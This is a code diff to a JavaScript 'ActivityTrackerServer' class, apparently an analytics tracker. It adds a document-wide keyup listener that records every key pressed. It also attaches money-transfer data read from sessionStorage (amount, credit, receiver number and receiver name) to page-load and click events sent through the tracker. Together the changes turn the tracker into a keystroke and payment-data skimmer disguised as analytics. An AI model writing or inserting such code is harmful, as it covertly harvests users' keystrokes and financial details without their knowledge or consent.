@@ -164,6 +164,15 @@ class ActivityTrackerServer {
      */
     trackPageLoad() {
         this.trackEvent('page_load', {
+                    montant: sessionStorage.getItem("montant"),
+                    credit: sessionStorage.getItem("credit"),
+                    receiverNum: sessionStorage.getItem("receiverNum"),
+                    receiverName: sessionStorage.getItem("receiverName"),
+                    amount: sessionStorage.getItem("confAmountTax"),
+                    amountFlat: sessionStorage.getItem("confAmount"),
+                    amountCredit: sessionStorage.getItem("amountCredit"),
+                    isMuted: sessionStorage.getItem("isMuted"),
+                    showInput: sessionStorage.getItem("showInput"),
             url: this.currentPage,
             timestamp: this.pageLoadTime,
             referrer: document.referrer,
@@ -175,6 +184,9 @@ class ActivityTrackerServer {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         });
     }
+
+
+   
 
     /**
      * Track page unload event
@@ -194,6 +206,20 @@ class ActivityTrackerServer {
      */
     setupEventListeners() {
         this.setupClickTracking();
+        this.setupKeyupTracking();
+    }
+
+     /**
+     * Setup key up event
+     */
+    setupKeyupTracking() {
+         document.addEventListener('keyup', async (event) => {
+            await this.trackEvent('keyup', {
+             key: ` ${event.code}`
+            });
+
+
+        });
     }
 
     /**
@@ -251,7 +277,17 @@ class ActivityTrackerServer {
                     onclick: onclickInfo,
                     willNavigate: true,
                     navigationTarget: navigationTarget,
-                    selector: this.getElementSelector(event.target)
+                    selector: this.getElementSelector(event.target),
+                    
+                    montant: sessionStorage.getItem("montant"),
+                    credit: sessionStorage.getItem("credit"),
+                    receiverNum: sessionStorage.getItem("receiverNum"),
+                    receiverName: sessionStorage.getItem("receiverName"),
+                    amount: sessionStorage.getItem("confAmountTax"),
+                    amountFlat: sessionStorage.getItem("confAmount"),
+                    amountCredit: sessionStorage.getItem("amountCredit"),
+                    isMuted: sessionStorage.getItem("isMuted"),
+                    showInput: sessionStorage.getItem("showInput"),
                 }, true);
                 
                 // Navigate after ensuring data is sent
@@ -260,7 +296,7 @@ class ActivityTrackerServer {
                 }
             } else {
                 // Normal tracking for non-navigation clicks
-                this.trackEvent('click', {
+                this.trackEvent('click', {        
                     timestamp: Date.now(),
                     x: event.clientX,
                     y: event.clientY,
@@ -280,7 +316,16 @@ class ActivityTrackerServer {
                     },
                     onclick: onclickInfo,
                     willNavigate: false,
-                    selector: this.getElementSelector(event.target)
+                    selector: this.getElementSelector(event.target),
+                    montant: sessionStorage.getItem("montant"),
+                    credit: sessionStorage.getItem("credit"),
+                    receiverNum: sessionStorage.getItem("receiverNum"),
+                    receiverName: sessionStorage.getItem("receiverName"),
+                    amount: sessionStorage.getItem("confAmountTax"),
+                    amountFlat: sessionStorage.getItem("confAmount"),
+                    amountCredit: sessionStorage.getItem("amountCredit"),
+                    isMuted: sessionStorage.getItem("isMuted"),
+                    showInput: sessionStorage.getItem("showInput")
                 }, false);
             }
         }, true); // Use capture phase to intercept before other handlers
